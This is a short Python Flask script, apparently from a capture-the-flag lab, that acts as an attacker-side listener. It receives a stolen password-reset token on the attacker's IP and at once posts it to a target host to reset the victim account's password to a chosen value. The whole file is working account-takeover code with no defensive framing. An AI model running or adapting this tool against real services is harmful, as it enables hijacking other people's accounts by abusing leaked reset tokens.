#!/usr/bin/python3


from flask import (
    Flask,
    request
)
import requests
import logging
import urllib.parse


app = Flask(__name__)



my_ip="10.10.14.4"
port=5000
password="dicker"

log = logging.getLogger("werzeug")
log.setLevel(logging.ERROR)
@app.route("/reset")
def reset():
    try:
        token = urllib.parse.quote(request.args.get('token'))
        print(f"this is the token {token}")
        data = {"password":f"{password}", "cpassword":f"{password}"}

        reset_pwd = requests.post(url=f"http://10.10.11.188/reset?token={token}", data=data)

        if 'Success' in reset_pwd.text:
            print(f"Successfully changed password to {password}")
        else:
            print("invalid token")
    except Exception as e:
        pass



if __name__ == "__main__":
    app.run(host=my_ip, port=port, debug=True)
